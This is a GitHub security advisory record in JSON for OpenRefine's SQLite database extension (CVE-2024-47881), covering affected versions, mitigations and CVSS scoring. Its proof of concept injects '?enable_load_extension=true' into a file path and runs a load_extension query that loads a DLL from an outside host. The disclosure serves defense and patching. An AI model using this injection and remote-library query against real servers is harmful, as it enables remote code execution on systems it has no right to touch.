{
  "Severity": "HIGH",
  "UpdatedAt": "2024-10-24T18:11:21Z",
  "Package": {
    "Ecosystem": "MAVEN",
    "Name": "org.openrefine:database"
  },
  "Advisory": {
    "DatabaseId": 264710,
    "Id": "GSA_kwCzR0hTQS04N2NmLWo3NjMtdnZoOM4ABAoG",
    "GhsaId": "GHSA-87cf-j763-vvh8",
    "References": [
      {
        "Url": "https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-87cf-j763-vvh8"
      },
      {
        "Url": "https://github.com/OpenRefine/OpenRefine/commit/853a1d91662e7dc278a9a94a38be58de04494056"
      },
      {
        "Url": "https://github.com/advisories/GHSA-87cf-j763-vvh8"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-87cf-j763-vvh8"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2024-47881"
      }
    ],
    "Description": "### Summary\n\nIn the `database` extension, the \"enable_load_extension\" property can be set for the SQLite integration, enabling an attacker to load (local or remote) extension DLLs and so run arbitrary code on the server.\n\nThe attacker needs to have network access to the OpenRefine instance.\n\n### Details\n\nThe `database` extension, with some restrictions, lets users connect to any database they wish by filling in different parts of the JDBC URL that is used. For the SQLite integration, the extension expects a file path pointing to a database file (or a place where such a file can be created). This means that users can:\n\n* Read files on local or SMB filesystems, provided they are SQLite databases.\n* Write to files on local or SMB filesystems, as long as those files are either SQLite databases or empty.\n\nThis seems to be the expected behavior.\n\nHowever, by adding `?enable_load_extension=true` to the filename, a [feature](https://www.sqlite.org/loadext.html) is toggled that additionally allows loading and executing shared libraries mentioned in queries, leading to remote code execution. On Windows specifically, those libraries may also come from shared folders.\n\nPossible mitigation and hardening steps could include:\n\n- Having users upload the SQLite database file they want to look at, storing it under some safe name, then opening that, rather than accepting a file path\n- If that is not feasible: making the path relative to, and checking that it does not escape, the workspace directory\n- If that is also not feasible: adding additional checks so that the path at least does not point to other machines or add JDBC parameters\n- Always using the READONLY open mode\n- Explicitly setting enable_load_extension to off\n- Enforcing [stricter limits](https://www.sqlite.org/security.html) and similar precautions\n\n### PoC\n\nTested on a Windows 11 machine. \n\n1. Start OpenRefine and choose \"Create project\", \"Database\", database type \"SQLite\".\n2. Type a writable file path followed by `?enable_load_extension=true`.\n3. Click Connect. The connection should succeed.\n4. Use `SELECT load_extension('\\\\wandernauta.nl\\public\\libcalculator.dll');` as the query.\n5. Assuming there are no firewalls in the way, a few Windows calculators should open.\n\nThe same file is available from https://wandernauta.nl/libcalculator.dll if needed.\n\n### Impact\n\nRemote code execution for attackers with network access to OpenRefine.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2024-10-24T18:11:20Z",
    "Severity": "HIGH",
    "Summary": "OpenRefine's SQLite integration allows filesystem access, remote code execution (RCE)",
    "UpdatedAt": "2024-10-24T18:11:21Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 8.1,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "3.8.3"
      },
      "VulnerableVersionRange": "\u003e= 3.4-beta, \u003c 3.8.3"
    }
  ]
}